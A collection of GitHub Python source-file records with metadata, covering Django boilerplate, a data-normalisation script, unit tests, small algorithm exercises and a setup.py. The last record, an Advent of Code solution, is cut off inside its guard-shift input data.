{"blob_id": "3f501fa6d7f21f7e3ca9c5ee20a69ce34cab085c", "directory_id": "4f21bffeb7ef80b4bb03b19318efa8ae883f3c3c", "path": "/final/manage.py", "content_id": "18a0ee21ccc975a376f0f3c6a815ad4818debe9f", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "rpritam010/AUTOMATIC-LICENSE-PLATE-RECOGNITION-SYSTEM-", "snapshot_id": "0d93c9d1327ec2bf9e5b631fc29cbd5c5e9f08ff", "revision_id": "587b483d4e146b2d033465fd27a9d0a8c4587b3b", "branch_name": "refs/heads/master", "visit_date": "2020-04-20 02:35:11.248956", "revision_date": "2019-06-11 07:17:49", "committer_date": "2019-06-11 07:17:49", "github_id": "168575157", "star_events_count": "1", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "558", "extension": "py", "content": "#!/usr/bin/env python\r\nimport os\r\nimport sys\r\n\r\nif __name__ == '__main__':\r\n    os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'recognition.settings')\r\n    try:\r\n        from django.core.management import execute_from_command_line\r\n    except ImportError as exc:\r\n        raise ImportError(\r\n            \"Couldn't import Django. Are you sure it's installed and \"\r\n            \"available on your PYTHONPATH environment variable? Did you \"\r\n            \"forget to activate a virtual environment?\"\r\n        ) from exc\r\n    execute_from_command_line(sys.argv)\r\n"}
{"blob_id": "7e3a3bf22bd64c53ffdb6d059ddd55e06a2f0295", "directory_id": "e81722d244e8647e64f2ffb44e028a1f4c5df410", "path": "/prepare_data.py", "content_id": "98e49fd258646947ae8b42f4672c8a4727556cfe", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "bvillasen/volumeRender", "snapshot_id": "9c16419d19e361799ef6c1a371e6236c90139b79", "revision_id": "f36586fbf7775d4d39545064b5771cad86d3dfef", "branch_name": "refs/heads/master", "visit_date": "2021-08-30 19:43:10.127411", "revision_date": "2020-10-18 02:05:21", "committer_date": "2020-10-18 02:05:21", "github_id": "198691927", "star_events_count": "1", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "2081", "extension": "py", "content": "import os, sys\nimport numpy as np\nimport h5py as h5\n\ncurrentDirectory = os.getcwd()\nsrcDirectory = currentDirectory + \"/src/\"\ndataDirectory = currentDirectory + \"/data_src/\"\nsys.path.extend([ srcDirectory, dataDirectory ] )\nfrom tools import create_directory\nfrom load_data_cholla_distributed import load_snapshot_data_distributed\n\n#Load Snapshot Data\nnPoints = 1024\n\n# dataDir = '/raid/bruno/data/'\ndataDir = '/data/groups/comp-astro/bruno/'\ninDir = dataDir + 'cosmo_sims/{0}_hydro_50Mpc/output_files_pchw18/'.format(nPoints)\nstats_dir = inDir + 'statistics/'\noutDir = dataDir + 'cosmo_sims/{0}_hydro_50Mpc/snapshots_prepared/'.format(nPoints)\ncreate_directory( outDir )\n\ndata_type = 'hydro'\n# data_type = 'particles'\n\n# Load Statistics\nstatistics = h5.File( stats_dir + 'stats_{0}.h5'.format(data_type), 'r')\n\nfields = ['density']\nprecision = np.float32\n\nLbox = 5000    #kpc/h\nif nPoints == 1024: proc_grid = [ 4, 2, 2]\nif nPoints == 2048: proc_grid = [ 8, 8, 8]\nbox_size = [ Lbox, Lbox, Lbox ]\ngrid_size = [ nPoints, nPoints, nPoints ] #Size of the simulation grid\nsubgrid = [ [0, nPoints], [0, nPoints], [0, nPoints] ] #Size of the volume to load\n\nfield = 'density'\n\nmin_val = statistics[field].attrs['min_global']\nmax_val = statistics[field].attrs['max_global']\nprint( \"Min: {0}   Max: {1}\".format(min_val, max_val ))\n\n\n\nn_snapshot = 169\n# for n_snapshot in range(170):\n\ndata = load_snapshot_data_distributed( n_snapshot, inDir, data_type, fields, subgrid,  precision, proc_grid,  box_size, grid_size, show_progess=True )\n\n\ndata_vals = data[data_type][field]  \ndata_vals -= min_val\n\n\n# Normalize Data\nmax_val = (max_val - min_val) / 1000 \ndata_vals = np.clip( data_vals, a_min=None, a_max=max_val ) \ndata_vals = np.log10(data_vals + 1) / np.log10( max_val + 1)\n\n\n\n# Change to 256 range\ndata_vals = (255*(data_vals)).astype(np.uint8)\n\n#Write to file\nout_file_name = outDir + '{0}_{1}_{2}.h5'.format( data_type, field, n_snapshot )\nout_file = h5.File( out_file_name, 'w')\nout_file.create_dataset( field, data=data_vals )\nout_file.close()\nprint( \"Saved File: \" + out_file_name )\n"}
{"blob_id": "a4b7f29ee74699cb328352c115a50992d08f717e", "directory_id": "41f7e02bab8216f4ebcae870aeeb9652b04e4590", "path": "/tests/test_item_subsystem.py", "content_id": "b1dcffa9029f634b206cfa6f20d4b0d574f8d232", "detected_licenses": "['BSD-2-Clause']", "license_type": "permissive", "repo_name": "marius-cristian/numerous", "snapshot_id": "22eb19426350ecea027989325484583920674307", "revision_id": "af415f075c55401ca652dc5acbea93f4506e26ef", "branch_name": "refs/heads/master", "visit_date": "2020-11-27 11:33:14.371393", "revision_date": "2020-06-21 06:54:03", "committer_date": "2020-06-21 06:54:03", "github_id": "229422538", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "2019-12-21 12:12:09", "gha_created_at": "2019-12-21 12:12:09", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "1843", "extension": "py", "content": "import pytest\n\nfrom numerous.engine.system import Connector, Item\nfrom numerous import VariableDescription, VariableType\n\n\n@pytest.fixture\ndef item_with_namespace():\n\n    item = Item('item_with_namespace')\n    test_namespace = item.create_namespace('test_namespace')\n\n    var_desc = VariableDescription(tag='A_parameter', initial_value=0, type=VariableType.PARAMETER)\n    test_namespace.create_variable_from_desc(var_desc)\n\n    var_desc = VariableDescription(tag='B_state', initial_value=0, type=VariableType.STATE)\n    test_namespace.create_variable_from_desc(var_desc)\n\n    return item\n\n\ndef test_add_namespace_twice(item_with_namespace):\n    with pytest.raises(ValueError, match=r\".*is already registered in item.*\"):\n        item_with_namespace.create_namespace('test_namespace')\n\n\ndef test_add_binding_twice(item_with_namespace):\n    c = Connector('test')\n    with pytest.raises(ValueError, match=r\".*is already registered in connector.*\"):\n        c.create_binding('b1')\n        c.create_binding('b1')\n\n\ndef test_add_mapping(item_with_namespace):\n    ### It is not possible to use local variables for variables in namespace\n    ### A_p = item_with_namespace.test_namespace.A_parameter\n    ###\n    test_namespace = item_with_namespace.test_namespace\n\n    test_namespace.A_parameter.value = 1\n    test_namespace.B_state.value = 0\n\n    assert test_namespace.A_parameter.value != test_namespace.B_state.value\n\n    test_namespace.A_parameter = test_namespace.B_state\n\n    assert test_namespace.A_parameter.get_value() == 0\n    assert bool(test_namespace.A_parameter.mapping) == 1\n    assert test_namespace.B_state == test_namespace.A_parameter.mapping\n\n    test_namespace.B_state.value = 10\n    assert test_namespace.A_parameter.get_value() == 10\n\n    test_namespace.A_parameter.value = 20\n    assert test_namespace.B_state.get_value() == 10\n"}
{"blob_id": "8da95c69f1c96ea6a0d8732416f51b8331356f90", "directory_id": "8b2376e2e998cb64676106838516e927693a338a", "path": "/manage.py", "content_id": "ff378c53e6f7c4e149bc5d2f06b98fcda6069323", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "imchandeliya/Ikka", "snapshot_id": "9cf680d7ff5784e9b8e0f06ffc64b25eca84b9b0", "revision_id": "3f703493fa14a34f5be6d9e153c2a8c4fc261954", "branch_name": "refs/heads/master", "visit_date": "2021-04-04 06:06:15.586329", "revision_date": "2020-03-25 12:18:53", "committer_date": "2020-03-25 12:18:53", "github_id": "248430582", "star_events_count": "1", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "627", "extension": "py", "content": "#!/usr/bin/env python\n\"\"\"Django's command-line utility for administrative tasks.\"\"\"\nimport os\nimport sys\n\n\ndef main():\n    os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'AceCrud.settings')\n    try:\n        from django.core.management import execute_from_command_line\n    except ImportError as exc:\n        raise ImportError(\n            \"Couldn't import Django. Are you sure it's installed and \"\n            \"available on your PYTHONPATH environment variable? Did you \"\n            \"forget to activate a virtual environment?\"\n        ) from exc\n    execute_from_command_line(sys.argv)\n\n\nif __name__ == '__main__':\n    main()\n"}
{"blob_id": "970e75fa5bf67b2442c0053f46b9b75a1bd89e12", "directory_id": "add74ecbd87c711f1e10898f87ffd31bb39cc5d6", "path": "/xcp2k/__init__.py", "content_id": "bd9846f799c29d00ccefc844e142c82e2631c10c", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "superstar54/xcp2k", "snapshot_id": "82071e29613ccf58fc14e684154bb9392d00458b", "revision_id": "e8afae2ccb4b777ddd3731fe99f451b56d416a83", "branch_name": "refs/heads/master", "visit_date": "2021-11-11 21:17:30.292500", "revision_date": "2021-11-06 06:31:20", "committer_date": "2021-11-06 06:31:20", "github_id": "62589715", "star_events_count": "8", "fork_events_count": "2", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "28", "extension": "py", "content": "from xcp2k.cp2k import CP2K\n"}
{"blob_id": "ec9a7122e6f16dacac9ea0bb1f5f4e3f8f1635ef", "directory_id": "07e584ae13b64c350263a37f078d5229e9e378fb", "path": "/test/valid_auth_user_pass_test.py", "content_id": "bc4d4c65b62d2f1a652e5c672279304af4829a07", "detected_licenses": "['MIT']", "license_type": "permissive", "repo_name": "rickmer/pushover", "snapshot_id": "2bc62b6dea90f216e9c6c0603d0b7dfc62eb3309", "revision_id": "edb6ebc92f107c34f6fba11a277630166a3f5e33", "branch_name": "refs/heads/master", "visit_date": "2020-06-01 19:17:49.343587", "revision_date": "2015-05-08 16:13:39", "committer_date": "2015-05-08 16:13:39", "github_id": "18155270", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "301", "extension": "py", "content": "from pushover import _valid_auth_\n\n\ndef test_auth_invalid():\n    assert not _valid_auth_('asdfasdfdsaklgjfdsljfdslkghjlfdkjsghlskdfjhglksdfjghlksdfjhglsdfkhjksdfjhgfdsjklghlkjdfshglksdfghjlksdfjhglkjsdfhglkjdfshglkjhdsflkglksdjfgh')\n\n\ndef test_auth_valid():\n    assert _valid_auth_('user123:pass123')\n"}
{"blob_id": "aab69f6b0401a8cc2bd6b79c0739141f50a157eb", "directory_id": "5317736acb8872e7ef5eecb57058e03ddbdbfaca", "path": "/6.006 Introduction to Algorithms/2D_Peak_Finder.py", "content_id": "94ff09da211234b36fe67d08b914cf7a65b7d5c3", "detected_licenses": "['MIT']", "license_type": "permissive", "repo_name": "SunnyVikasMalviya/MIT-Open-Courseware", "snapshot_id": "2cb41820d5093f546724cd178202600e40a9b5e3", "revision_id": "957791850b346dca1abd740ec17697dba7495737", "branch_name": "refs/heads/master", "visit_date": "2020-04-08 04:28:21.400907", "revision_date": "2020-04-07 16:57:03", "committer_date": "2020-04-07 16:57:03", "github_id": "159017946", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "1826", "extension": "py", "content": "'''\r\nLOCAL 2D PEAK(s) FINDER\r\nThe program finds and returns index of a local maxima from a given matrix\\\r\nof numbers. An index is a peak if the value at that index is greater than the\\\r\nvalues at the adjacent indices.\r\n'''\r\ndef initialize_elements() :\r\n    n = int(input(\"Enter number of rows in the matrix:\"))\r\n    matrix = [[0 for x in range(1)] for y in range(n)]\r\n    #print(matrix)\r\n    for i in range(n) :\r\n        lst = list(int(x.strip()) for x in input().split(' '))\r\n        matrix[i] = lst            \r\n    print(matrix)\r\n    print(\"Index with local maxima or peak is :\")\r\n    peak_2d = peak_finder(matrix)\r\n    display_output(peak_2d)\r\n    \r\ndef peak_finder(mat) :\r\n    j = int(len(mat[0])/2)\r\n    col_max = -1\r\n    for x in range(len(mat)) :\r\n        if col_max < mat[x][j] :\r\n            col_max = mat[x][j]\r\n            i = x\r\n    if mat[i][j] < mat[i][j-1] and j-1 >= 0 :\r\n        mat1 = [[0 for a in range(1)] for b in range(len(mat))]\r\n        for p in range(mat) :\r\n            for q in range[0:j+1] :\r\n                mat1[p][q] = mat[i][j]\r\n        peak = peak_finder(mat1)\r\n    elif mat[i][j] < mat[i][j+1] and j+1 < len(mat[0]) :\r\n        mat1 = [[0 for a in range(1)] for b in range(len(mat))]\r\n        for p in range(mat) :\r\n            for q in range[j:len(mat[0])] :\r\n                mat1[p][q] = mat[i][j]\r\n\r\n        mat1 = mat[0:len(mat), j:len(mat[0])]\r\n        peak = peak_finder(mat1)\r\n    else :\r\n        peak = mat[i][j]\r\n        return peak\r\n    return peak\r\n        \r\ndef display_output(peak_2d) :\r\n    print(peak_2d)\r\n\r\ninitialize_elements()\r\n\r\n'''\r\nNote : Matrices don't exist in python implicitly. Hence, a line like A = [][] \\\r\nwill produce an error. First, we have to intialize the outer lists before \\\r\nadding items to the inner list. It's called list comprehension in python. \r\n'''\r\n"}
{"blob_id": "223a64bddd8cfc48641b4bd0de9f0a3b84a431c7", "directory_id": "6a9d1ed849344a9f9f65a79b33984627b098b5be", "path": "/Permutations.py", "content_id": "9e8b0e0030c9dd116d5eb4a857949cb8cd37923d", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "kd1726/Algorithms", "snapshot_id": "ae1d41bf285a05fd29eb3645e7162cc5a9346dc6", "revision_id": "d69ec224ac8c1d6a26a34de25e2ac7dcb46f61ad", "branch_name": "refs/heads/main", "visit_date": "2023-04-19 16:30:20.780013", "revision_date": "2021-04-09 21:47:23", "committer_date": "2021-04-09 21:47:23", "github_id": "355355436", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "560", "extension": "py", "content": "def perm1(arr):\n    if len(arr)==0 or len(arr)==1:\n        return [arr]\n\n    else:\n        l = []\n        for x in range(len(arr)):\n            i  = arr[x]\n            ix = arr[0:x]+arr[x+1:]\n            for p in perm1(ix):\n                l.append([i]+p)\n        return l\n#This algorithm is crappy. It has back time complexity and a bad space complexity. I can convert this into a generator to make the space complextiy much smallet\n#but I would still have a terrible time complexity. I could probably use a hash table to fix it and make it run in O(n) time.\n"}
{"blob_id": "676d09ee42003b82fb8b63c56bd0e66899d79c3f", "directory_id": "6f2712e1392be70366ce42ba391a9891388a6c2d", "path": "/tests/player.py", "content_id": "3e3a10ade0e1441036ee7b98667fb858710ff1f0", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "TYMG/py_blackjack", "snapshot_id": "8e8892e4eec000097a3f90e28b04ca817e3cf5a2", "revision_id": "86918dc0c2f20d6926d9c12480bcbb989baf354e", "branch_name": "refs/heads/main", "visit_date": "2023-01-30 23:55:29.312427", "revision_date": "2020-12-13 20:56:26", "committer_date": "2020-12-13 20:56:26", "github_id": "318909505", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "2020-12-13 20:56:27", "gha_created_at": "2020-12-05 23:22:25", "gha_language": "Python", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "684", "extension": "py", "content": "import unittest\nfrom blackjack import engine\n\n\nclass PlayerTestEngine(unittest.TestCase):\n    def test_create_player(self):\n        print('\\n'+'*****'*20)\n        player = engine.Player(\"test\")\n        print(player)\n\n    def test_update_money_positive(self):\n        print('\\n'+'*****'*20)\n        player = engine.Player(\"test\")\n        print(player)\n        player.update_money(50)\n        print(player)\n\n    def test_update_money_negative(self):\n        print('\\n'+'*****'*20)\n        print(\"Testing Taking Money\")\n        player = engine.Player(\"test\")\n        print(player)\n        player.update_money(50*-1)\n        print(player)\n\n\nif __name__ == '__main__':\n    unittest.main()\n"}
{"blob_id": "341272f2ba21e15c9b8cbe2a99f7870747e599a3", "directory_id": "37f8ff487127f1a2393b9ec3cf2580860c0b150f", "path": "/sentieriApp/urls.py", "content_id": "886e8705eb57f648d77a30758e01d477d8392132", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "danielevezz/sentieri", "snapshot_id": "34b8ea4e262ac78933729c0fa69afd6e916e7d96", "revision_id": "e76260519ebe42ae27f4554b7affaed1f7d0eb24", "branch_name": "refs/heads/master", "visit_date": "2020-05-26 10:09:35.949451", "revision_date": "2019-07-23 08:17:31", "committer_date": "2019-07-23 08:17:31", "github_id": "188197530", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "1311", "extension": "py", "content": "from django.urls import path, include\nfrom . import views\n\nurlpatterns = [\n    path('', views.index, name='index'),\n    path(\"<int:idSentiero>/\", views.dettagliSentiero, name='dettagliSentiero'),\n    path(\"utente/<int:idUtente>/\", views.dettagliUtente, name='areaPersonale'),\n    path(\"punto/<int:idPtoGeografico>/\", views.dettagliPuntoGeografico, name='dettagliPuntoGeografico'),\n    path(\"creazione/\", views.creazioneAccount, name=\"creazioneNuovoAccount\"),\n    path(\"esperienza/\", views.inserisciEsperienza, name=\"inserisciEsperienza\"),\n#    path(\"selezionaCategorie/\", views.selezionaCategorie, name=\"selezionaCategorie\"),\n    path(\"elencoSentieri/\", views.elencoSentieri, name=\"elencoSentieri\"),\n    path(\"elencoSentieriDiUtente/<int:idUtente>/\", views.elencoSentieriDiUtente, name=\"elencoSentieriDiUtente\"),\n    path(\"commentiDiUtente/<int:idUtente>/\", views.commentiDiUtente, name=\"commentiDiUtente\"),\n    path(\"modificaAccount\", views.modificaAccount, name=\"modificaAccount\"),\n    path(\"luogo/<int:idLuogo>/\", views.dettagliLuogo, name=\"dettagliLuogo\"),\n    path(\"elencoUtenti/\", views.elencoUtenti, name=\"elencoUtenti\"),\n    path(\"elencoSentieriDiUnLuogo/\", views.elencoSentieriDiUnLuogo, name=\"elencoSentieriDiUnLuogo\")\n\n]\n\nurlpatterns += [\n    path('accounts/', include('django.contrib.auth.urls')),\n]"}
{"blob_id": "c90836e944d0a7d628125e73311caeb55bca0c38", "directory_id": "61fd9408c2d1467de8c3dd3187e8fc03dbcae489", "path": "/GoFashion/GoFashion/wsgi.py", "content_id": "8cd77cd2ef10860b2d177508f9bc8b4a21a38b26", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "prajanshrestha/GoFashion", "snapshot_id": "18a37446dbd0126f4252bb5b538aa441ce7ff0eb", "revision_id": "5aedda51df03fd99070de341b598efa3545997ea", "branch_name": "refs/heads/main", "visit_date": "2023-04-24 05:24:11.445031", "revision_date": "2021-05-13 01:43:46", "committer_date": "2021-05-13 01:43:46", "github_id": "341805359", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "395", "extension": "py", "content": "\"\"\"\nWSGI config for GoFashion project.\n\nIt exposes the WSGI callable as a module-level variable named ``application``.\n\nFor more information on this file, see\nhttps://docs.djangoproject.com/en/3.1/howto/deployment/wsgi/\n\"\"\"\n\nimport os\n\nfrom django.core.wsgi import get_wsgi_application\n\nos.environ.setdefault('DJANGO_SETTINGS_MODULE', 'GoFashion.settings')\n\napplication = get_wsgi_application()\n"}
{"blob_id": "c563f457ac3cf1a10056008844f45aeb2155cea7", "directory_id": "3cd535bb16ef25f570c6dcabd17b7bb801c6278e", "path": "/setup.py", "content_id": "ffc6e6f74975d96fba688cc5f35de4d798f022a8", "detected_licenses": "['Apache-2.0']", "license_type": "permissive", "repo_name": "koaaihub/vitone", "snapshot_id": "8b47446298220262562da5f25a6d6d4654c7e95a", "revision_id": "f2863b32e65521ea621d5197619970153b1a0c50", "branch_name": "refs/heads/master", "visit_date": "2023-06-24 11:25:12.933766", "revision_date": "2021-07-28 08:30:03", "committer_date": "2021-07-28 08:30:03", "github_id": "390258286", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "927", "extension": "py", "content": "import pathlib\nfrom setuptools import setup\n\n# The directory containing this file\nHERE = pathlib.Path(__file__).parent\n\n# The text of the README file\nREADME = (HERE / \"README.md\").read_text()\n\n# This call to setup() does all the work\nsetup(\n    name=\"vitone\",\n    version=\"1.0\",\n    description=\"Format Vietnamese tone\",\n    long_description=README,\n    long_description_content_type=\"text/markdown\",\n    url=\"https://github.com/KoaAIHub/vitone\",\n    author=\"Koa\",\n    author_email=\"koadiy.95@gmail.com\",\n    license=\"Apache License\",\n    classifiers=[\n        \"License :: OSI Approved :: MIT License\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n    ],\n    packages=[\"vitone\"],\n    include_package_data=True,\n    install_requires=[\"ftfy==5.5.1\", \"bogo==1.1\"],\n    entry_points={\n        \"console_scripts\": [\n            \"realpython=vitone.__main__:main\",\n        ]\n    },\n)\n"}
{"blob_id": "493d44d1a3d1d21fee6524ad7243432652f36d53", "directory_id": "5d9a6773eb6e7549855811e3715a73509ccee9df", "path": "/2018/04.py", "content_id": "c8adaf430eb9f91a4770c45ce9975e8ac0d4059b", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "Axenu/AdventOfCodeSolutions", "snapshot_id": "9f8dfeff4d32e266c9119716cae5432ba16bceef", "revision_id": "25b5ec1d888710fa63c1244e336d96aefda32e72", "branch_name": "refs/heads/master", "visit_date": "2021-01-12 09:31:37.165808", "revision_date": "2018-12-07 06:16:14", "committer_date": "2018-12-07 06:16:14", "github_id": "76182130", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "39554", "extension": "py", "content": "input_data = '''[1518-05-11 00:22] falls asleep\n[1518-10-11 00:51] wakes up\n[1518-10-12 00:31] wakes up\n[1518-04-08 00:57] wakes up\n[1518-09-26 23:59] Guard #2851 begins shift\n[1518-11-06 00:40] wakes up\n[1518-08-06 00:04] Guard #2851 begins shift\n[1518-09-27 00:54] wakes up\n[1518-07-09 00:00] Guard #2153 begins shift\n[1518-04-11 00:37] falls asleep\n[1518-10-04 00:28] falls asleep\n[1518-05-22 23:59] Guard #2267 begins shift\n[1518-11-02 00:00] Guard #163 begins shift\n[1518-07-03 00:55] wakes up\n[1518-11-11 00:42] wakes up\n[1518-08-06 00:45] falls asleep\n[1518-07-01 00:35] wakes up\n[1518-04-12 00:51] wakes up\n[1518-09-20 00:49] wakes up\n[1518-06-24 00:04] falls asleep\n[1518-07-02 00:54] wakes up\n[1518-06-22 00:43] falls asleep\n[1518-04-01 23:57] Guard #163 begins shift\n[1518-06-02 00:55] falls asleep\n[1518-08-28 00:18] falls asleep\n[1518-05-27 00:10] falls asleep\n[1518-07-31 00:18] falls asleep\n[1518-11-14 00:08] falls asleep\n[1518-06-04 00:58] wakes up\n[1518-10-30 00:59] wakes up\n[1518-04-14 00:48] wakes up\n[1518-10-08 23:56] Guard #1601 begins shift\n[1518-03-08 00:42] falls asleep\n[1518-06-14 00:53] falls asleep\n[1518-11-16 00:31] falls asleep\n[1518-07-09 00:48] wakes up\n[1518-04-29 00:48] wakes up\n[1518-08-30 00:49] wakes up\n[1518-08-26 00:33] falls asleep\n[1518-09-04 00:48] falls asleep\n[1518-07-18 00:46] wakes up\n[1518-03-17 00:53] wakes up\n[1518-08-02 00:46] falls asleep\n[1518-08-13 00:55] wakes up\n[1518-03-15 23:57] Guard #2267 begins shift\n[1518-03-26 23:48] Guard #2851 begins shift\n[1518-11-08 00:05] falls asleep\n[1518-11-22 00:27] wakes up\n[1518-04-19 00:18] wakes up\n[1518-11-09 00:18] falls asleep\n[1518-08-20 00:39] wakes up\n[1518-06-07 00:13] falls asleep\n[1518-10-09 00:34] falls asleep\n[1518-10-15 00:46] wakes up\n[1518-09-01 00:45] falls asleep\n[1518-11-14 00:16] wakes up\n[1518-06-05 00:54] wakes up\n[1518-09-15 00:29] falls asleep\n[1518-07-08 00:20] falls asleep\n[1518-03-09 00:34] wakes up\n[1518-11-07 00:47] wakes up\n[1518-03-27 00:46] falls asleep\n[1518-03-27 00:02] falls asleep\n[1518-05-23 00:21] falls asleep\n[1518-06-19 00:00] Guard #967 begins shift\n[1518-10-09 00:54] falls asleep\n[1518-09-17 00:03] falls asleep\n[1518-11-04 23:46] Guard #2851 begins shift\n[1518-06-29 00:09] falls asleep\n[1518-06-01 00:32] falls asleep\n[1518-05-30 23:56] Guard #1307 begins shift\n[1518-05-12 23:57] Guard #2267 begins shift\n[1518-05-30 00:37] falls asleep\n[1518-04-18 00:57] wakes up\n[1518-04-23 00:27] wakes up\n[1518-03-10 00:36] falls asleep\n[1518-10-21 00:47] falls asleep\n[1518-09-23 23:47] Guard #2399 begins shift\n[1518-05-15 00:06] falls asleep\n[1518-07-14 00:04] falls asleep\n[1518-10-14 00:56] wakes up\n[1518-11-19 00:14] falls asleep\n[1518-05-17 00:19] falls asleep\n[1518-05-26 00:28] falls asleep\n[1518-05-19 00:51] wakes up\n[1518-06-23 00:20] falls asleep\n[1518-04-04 00:45] falls asleep\n[1518-09-21 00:40] falls asleep\n[1518-03-04 00:54] falls asleep\n[1518-07-30 00:30] falls asleep\n[1518-07-02 23:57] Guard #691 begins shift\n[1518-07-29 00:07] wakes up\n[1518-04-29 00:38] falls asleep\n[1518-08-24 00:32] wakes up\n[1518-04-03 00:30] falls asleep\n[1518-06-09 00:54] wakes up\n[1518-07-22 00:27] wakes up\n[1518-09-15 00:56] falls asleep\n[1518-05-24 00:07] wakes up\n[1518-03-24 00:43] wakes up\n[1518-05-24 00:05] falls asleep\n[1518-11-17 00:24] wakes up\n[1518-06-04 00:05] falls asleep\n[1518-08-31 00:56] falls asleep\n[1518-11-19 00:22] wakes up\n[1518-07-12 23:59] Guard #2153 begins shift\n[1518-07-27 00:06] falls asleep\n[1518-05-31 00:35] wakes up\n[1518-06-15 00:40] wakes up\n[1518-08-17 00:57] wakes up\n[1518-10-13 00:07] falls asleep\n[1518-04-22 00:10] falls asleep\n[1518-10-11 00:55] falls asleep\n[1518-09-16 23:51] Guard #2851 begins shift\n[1518-10-21 00:37] falls asleep\n[1518-04-17 00:04] falls asleep\n[1518-06-06 00:00] Guard #2617 begins shift\n[1518-03-04 00:04] Guard #1307 begins shift\n[1518-07-08 00:04] Guard #2399 begins shift\n[1518-04-15 23:56] Guard #2267 begins shift\n[1518-11-04 00:10] falls asleep\n[1518-04-21 23:58] Guard #2851 begins shift\n[1518-07-10 00:52] wakes up\n[1518-09-14 00:57] wakes up\n[1518-09-23 00:34] falls asleep\n[1518-08-02 00:26] falls asleep\n[1518-05-25 00:28] falls asleep\n[1518-07-26 00:56] wakes up\n[1518-03-23 00:03] Guard #509 begins shift\n[1518-05-19 00:44] wakes up\n[1518-07-17 00:02] Guard #691 begins shift\n[1518-06-02 00:57] wakes up\n[1518-10-05 00:48] falls asleep\n[1518-04-04 00:29] wakes up\n[1518-04-28 00:57] wakes up\n[1518-10-22 00:00] Guard #1051 begins shift\n[1518-07-31 23:47] Guard #2447 begins shift\n[1518-05-16 00:45] wakes up\n[1518-08-28 00:52] falls asleep\n[1518-07-17 23:59] Guard #3559 begins shift\n[1518-07-13 00:53] wakes up\n[1518-07-29 00:54] wakes up\n[1518-11-10 00:56] falls asleep\n[1518-11-13 00:33] falls asleep\n[1518-05-15 00:54] wakes up\n[1518-11-01 00:14] falls asleep\n[1518-04-30 00:28] wakes up\n[1518-06-07 00:32] wakes up\n[1518-04-21 00:20] falls asleep\n[1518-04-26 00:31] wakes up\n[1518-11-10 23:59] Guard #1091 begins shift\n[1518-04-27 00:51] wakes up\n[1518-08-27 00:47] wakes up\n[1518-10-12 00:26] falls asleep\n[1518-08-13 00:02] Guard #2153 begins shift\n[1518-03-12 00:59] wakes up\n[1518-08-07 00:20] wakes up\n[1518-03-17 00:28] wakes up\n[1518-11-17 23:59] Guard #1051 begins shift\n[1518-06-26 00:02] falls asleep\n[1518-04-16 23:54] Guard #2267 begins shift\n[1518-11-15 00:59] wakes up\n[1518-08-15 00:01] falls asleep\n[1518-10-22 00:58] wakes up\n[1518-10-24 23:56] Guard #1117 begins shift\n[1518-09-24 00:51] wakes up\n[1518-06-16 00:42] falls asleep\n[1518-03-14 00:51] wakes up\n[1518-03-30 00:18] falls asleep\n[1518-05-01 23:46] Guard #1601 begins shift\n[1518-06-06 00:26] falls asleep\n[1518-04-06 00:51] wakes up\n[1518-10-09 00:57] wakes up\n[1518-07-01 00:43] falls asleep\n[1518-08-31 00:45] wakes up\n[1518-10-07 00:01] Guard #163 begins shift\n[1518-04-17 23:59] Guard #1307 begins shift\n[1518-03-10 00:44] wakes up\n[1518-09-14 00:55] falls asleep\n[1518-09-02 00:47] wakes up\n[1518-08-09 00:13] falls 